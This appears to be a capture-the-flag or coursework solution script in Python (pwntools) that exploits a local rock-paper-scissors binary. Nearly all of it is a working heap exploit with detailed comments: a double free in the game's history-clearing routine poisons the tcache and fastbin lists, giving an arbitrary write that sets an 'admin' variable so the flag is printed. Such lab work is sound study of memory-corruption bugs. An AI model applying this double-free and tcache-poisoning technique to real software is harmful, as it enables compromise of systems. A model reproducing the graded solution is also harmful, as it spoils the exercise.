#!/usr/bin/env python3

from pwn import *
# ************************** NOTES **************************
#   Stack content after main is called:
#       MAIN CALLED
#   0 pre main return address                                    (8 bytes)
#   1 previous frame pointer                                     (8 bytes)
#   2 canary                                     (rbp - 0x08)    (8 bytes)
#   3 history_buffer                             (rbp - 0xa0)    (128 bytes)
#   4 ptr_2 (computer move)                      (rbp - 0xa8)    (8 bytes)
#   5 ptr_1 (humans move)                        (rbp - 0xb0)    (8 bytes)
#   6 result                                     (rbp - 0xb4)    (4 bytes)
#   7 computer_win_count                         (rbp - 0xb8)    (4 bytes)
#   8 human_win_count                            (rbp - 0xbc)    (4 bytes)
#   9 menu_option                                (rbp - 0xc0)    (4 bytes)
#   10 history_buffer_top                        (rbp - 0xc4)    (4 bytes)
#   11 argc                                      (rbp - 0xd4)    (4 bytes)
#   12 argv       

#   Stack values after 8 rounds:
#   ptr_h15 -> computer_move_7
#   ptr_h14 -> human_move_7
#   ptr_h13 -> computer_move_6
#   ptr_h12 -> human_move_6
#   ptr_h11 -> computer_move_5
#   ptr_h10 -> human_move_5
#   ptr_h9 -> computer_move_4
#   ptr_h8 -> human_move_4
#   ptr_h7 -> computer_move_3
#   ptr_h6 -> human_move_3
#   ptr_h5 -> computer_move_2
#   ptr_h4 -> human_move_2
#   ptr_h3 -> computer_move_1
#   ptr_h2 -> human_move_1
#   ptr_h1 -> computer_move_0
#   ptr_h0 -> human_move_0
#   history_buffer
#   
#   ptr_2 -> computer_move_7
#   ptr_1 -> human_move_7
#  

# Pseudcode for mallocs and frees 
'''
void play_round(n : round_numer)
    ptr_1 = malloc(0x10) -> human_move_n
    
    if human_move_n is valid {
        ptr_2 = malloc(0x10) -> computer_move_n
        
        ptr_h(n) = ptr_1 
        ptr_h(n+1) = ptr_2
    }
        
void clear_history()
    for ptr in history_buffer:
        free(ptr)
    free(human_move)
'''

# Exploit steps
'''
step #1 - malloc enough to fill tcache
    play_round(1)
    play_round(2)
    play_round(3)
    play_round(4)
    play_round(5)
    
        # pointers become
        ptr_h9 -> computer_move_5
        ptr_h8 -> human_move_5
        ptr_h7 -> computer_move_4
        ptr_h6 -> human_move_4
        ptr_h5 -> computer_move_3
        ptr_h4 -> human_move_3
        ptr_h3 -> computer_move_2
        ptr_h2 -> human_move_2
        ptr_h1 -> computer_move_1
        ptr_h0 -> human_move_1

        ptr_2 -> human_move_5
        ptr_1 -> human_move_5


step #2 - fill tcache, double free in fastbins
    clear_history()
    
    # calls to free
        free(ptr_h0 -> human_move_1)
        free(ptr_h1 -> computer_move_1)
        free(ptr_h2 -> human_move_2)
        free(ptr_h3 -> computer_move_2)
        free(ptr_h4 -> human_move_3)
        free(ptr_h5 -> computer_move_3)
        free(ptr_h6 -> human_move_4)
        free(ptr_h7 -> computer_move_4)
        free(ptr_h8 -> human_move_5)
        free(ptr_h9 -> computer_move_5)
        
        free(ptr_1  -> human_move_5)
    
    #heap values
        #tcache
            tcache -> ptr_h6 -> ptr_h5 -> ptr_h4 -> ptr_h3 -> ptr_h2 -> ptr_h1 -> ptr_h0
    
        #fastbins
            should be 
            fastbins -> ptr_1 -> ptr_h9 -> ptr_h8 -> ptr_h7
            but is 
            fastbins -> ptr_1 -> ptr_h9 -> ptr_h8 (ptr_1 = ptr_h8)
    
step #3 - empty tcache
    play_round(6) 
    play_round(7)
    play_round(8)
    play_round(9) - invalid move
    
    #heap values
        #tcache
            tcache -> null
    
        #fastbins
            fastbins -> ptr_1 -> ptr_h9 -> ptr_h8 (ptr_1 = ptr_h8)
    
step #4 - write-what-where
    play_round(10) - invalid move / admin_address (where to write)
    play_round(11) - invalid
    play_round(12) - invalid
    play_round(13) - invalid move / admin_address (what to write)
    
    #calls to malloc
        ptr_1 = malloc
        *ptr_1 = admin_adresss
        ptr_1 = malloc
        *ptr_1 = invalid
        ptr_1 = malloc
        *ptr_1 = invalid
        ptr_1 = malloc
        *ptr_1 = value_to_write
        
step #5 - print flag
    main_5
        checks if admin_address = 0
            if admin != 0
                print flag

        but we changed it to not be 0, hence print flag
        
'''


def solve():

    # load the elf file and find the address of the win functions - works as the file was not compiled with PIE
    e = ELF("./rps")
    
    admin_address = hex(e.symbols["admin"])[2:].encode('utf-8')
    
    # arbitrary non-zero value picked - any non-zero value should work as the admin check only tests if the value is 0.
    admin_value = b'9'
    
    invalid_move = b'4'
    
    # launch program
    p=process('./rps')
    
    # play 5 rounds of rock, paper, scissors with arbitrary (valid) moves to fill the history_buffer with 10 entries
    #   each entry in history_buffer is a ptr to some memory allocated by malloc
    #   2 calls to malloc each round - one to store the humans move and one to store the computers move.
    #   each round of rock, paper, scissors stores the pointer to the humans move on the next available spot in the history_buffer
    #   followed by the same for the pointer to the computers move
    for i in range(5):
        send_play(p, b'1')
   
    # clear the history_buffer
    #   this triggers 11 (10 for the history_buffer, 1 for ptr_1 (human_move)) calls to free
    #
    #   should result in 7 (max) elements in the tcache, and 4 (the rest) elements in the fastbin, but a double free occurs
    #   as the 9th element in history_buffer and ptr_1 point to the same address
    #   hence, there is now a loop in the fastbin and it only contains 3 elements instead
    send_menu(p, b'4')
    
    # play 3 rounds of rock, paper, scissors with an arbitrary (valid) move to reduce the tcache to one element
    #   in each round of a valid move, 2 calls to malloc are made. malloc preferentially returns chunks from the tcache
    for i in range(3):
        send_play(p, b'1')
    
    # play an invalid move to finally empty the tcache 
    #   invalid moves don't query the computer for a turn, and hence only calls malloc once, emptying the tcache
    send_play(p, b'9')
    
    # at this point tcache is empty, and there are 3 elements in the fastbin (with a loop/double free)
    
    # play a round. 
    # intead of sending a valid move, play admin_address
    #   multiple things happen
    #       malloc allocates and returns the first chunk from the fastbin as the tcache is empty
    #           this is meant to remove the chunk from the fastbin, but it does not as its in there twice
    #           so if the fastbin looks like:         
    #               fastbin[0x10] -> chunk_a -> chunk_b -> chunk_a ->...
    #           malloc returns chunk_a and updates the references to :
    #               fastbin[0x10] -> chunk_b -> chunk_a -> chunk_b -> chunk_a -> ...
    #       the code sets ptr_1 -> chunk_a
    #       the code changes the value at ptr_1 to the admin_address, that is, *ptr_1 = admin_address
    #       this in turn makes chunk_a point to admin_address, that is chunk_a -> admin_address
    #       hence the content of the fastbin becomes:
    #               fastbin[0x10] -> chunk_b -> chunk_a -> admin_address  
    #       next, malloc does some house-keeping on the arena, and moves all it can from the fastbin to tcache
    #           the content of tcache now becomes:
    #               tcache -> chunk_b -> chunk_a -> admin_address
    #           and the content of the fastbin now becomes:
    #               fastbin[0x10] -> NULL
    send_play(p, admin_address)
   
   
    # play two rounds with arbitrary invalid moves to cycle through the tcache
    #   if an invalid move is played, malloc is only called once
    #   hence, after the two invalid moves, the content of the tcache becomes:
    #       tcache -> admin_address     
    send_play(p, b'9')
    send_play(p, b'9')
    
    # now, play another round, with the value to set the admin_address to
        # when the move is played, the code calls malloc to return somewhere to save the move
        # as the next value in the tcache is the admin_address, malloc assumes this is free memory and returns it to us as the next chunk
        # the code then sets ptr_1 -> admin_address
        # and then executes code translating to *ptr_1 = admin_value
        # overwriting the value at admin_address
    send_play(p, admin_value)
    
    # we then quit, trigging the admin value check (which we pass) which in turn calls Win, printing the flag
    send_menu(p, b'5')
    
    # retrieve the final result
    print(p.recvall().decode('utf-8','ignore'))


def send_play(p, value):
    
    # send bytes to pick the play a round option
    send_menu(p, b'1')
    
    # print the text returned from the terminal, along with our response - to aid in debugging/understanding
    print(p.recvuntil(b'> ').decode('utf-8'))
    print(value.decode('utf-8'))
    
    # send bytes corresponding to the value to play
    p.sendline(value)

 
def send_menu(p, value):
    
    # print the text returned from the terminal, along with our response - to aid in debugging/understanding
    print(p.recvuntil(b'? ').decode('utf-8'))
    print(value.decode('utf-8'))
    
    # send bytes to pick which menu option to choose
    p.sendline(value)
     

# DO NOT MODIFY THE CODE BELOW
def main(): 
    solve()
    
if __name__ == '__main__':
    main()

